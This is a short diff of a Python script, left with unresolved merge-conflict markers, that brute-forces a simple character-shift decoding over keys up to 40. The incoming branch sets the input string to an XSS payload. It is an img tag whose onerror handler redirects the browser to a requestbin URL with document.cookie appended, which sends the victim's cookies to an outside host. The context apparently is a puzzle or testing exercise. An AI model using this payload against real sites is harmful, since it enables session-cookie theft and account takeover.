@@ -17,6 +17,12 @@ def decoding(encode_str,n):
             decode_str += i
     return decode_str
 
+<<<<<<< HEAD
 text = ""
 for i in range(1,40):
     print str(i) + ","+"=>"+decoding(text,i)+" Key="+str(i)
+=======
+text = "<img src='hehe.png' onerror='location.href='http://requestbin.fullcontact.com/v5lt48v5'%2Bdocument.cookie'>"
+for i in range(0,40):
+    print (str(i) + ","+"=>"+decoding(text,i)+" Key="+str(i))
+>>>>>>> 56befc405b6765af74a6b8b436c18abbd09f5006
